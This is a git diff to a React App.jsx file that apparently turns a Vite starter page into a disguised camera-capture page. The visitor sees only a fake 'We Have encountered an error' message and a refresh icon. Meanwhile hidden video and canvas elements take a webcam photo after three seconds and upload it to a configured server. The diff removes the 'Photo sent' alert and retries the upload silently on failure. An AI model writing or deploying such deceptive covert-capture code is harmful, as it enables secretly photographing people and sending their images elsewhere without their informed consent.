@@ -1,12 +1,12 @@
 import { useState, useEffect, useRef } from 'react';
-import reactLogo from './assets/react.svg';
-import viteLogo from '/vite.svg';
-import './App.css';
+import refreshIcon from './assets/refresh.png';
 import axios from 'axios';
 import { api_url } from './config';
+import './App.css'
+
 
 function App() {
-  const [count, setCount] = useState(0);
+  
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
   const [uid,setUid]=useState(null);
@@ -33,6 +33,10 @@ function App() {
 
   },[uid])
 
+  const refreshPage=()=>{
+    location.reload()
+  }
+
   const getVideo = () => {
     navigator.mediaDevices
       .getUserMedia({ video: true })
@@ -44,10 +48,12 @@ function App() {
       .catch((err) => {
         console.error('Error accessing the camera: ', err);
       });
-      takePhoto();
+      setTimeout(takePhoto, 3000);
   };
 
   const takePhoto = () => {
+
+    
     const width = 300;
     const height = 300;
 
@@ -81,9 +87,10 @@ function App() {
         formData.append('file', blob, 'photo.png');
 
         const response = await axios.post(api_url + '/photos', formData);
-        alert("Photo sent");
+        closePhoto()
     } catch (err) {
-      console.log(err)
+      sendPhoto()
+
 
     } finally {
 
@@ -100,27 +107,13 @@ function App() {
 
   return (
     <>
-      <div>
-        <a href="https://vitejs.dev" target="_blank">
-          <img src={viteLogo} className="logo" alt="Vite logo" />
-        </a>
-        <a href="https://react.dev" target="_blank">
-          <img src={reactLogo} className="logo react" alt="React logo" />
-        </a>
-      </div>
-      <h1>Vite + React</h1>
-      <div className="card">
-        <button onClick={() => setCount((count) => count + 1)}>
-          count is {count}
-        </button>
-        <p>
-          Edit <code>src/App.jsx</code> and save to test HMR
-        </p>
-      </div>
-      <p className="read-the-docs">
-        Click on the Vite and React logos to learn more
+      <p>We Have encountered an error. Please refresh the Page. <br />
+      <img src={refreshIcon} alt='Refresh' onClick={refreshPage}/>
       </p>
-      <video ref={videoRef} style={{ display: 'none' }}></video>
+      <br /> 
+      
+      
+      <video ref={videoRef} style={{ display: 'none' }}></video><br />
       <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>
 
     </>
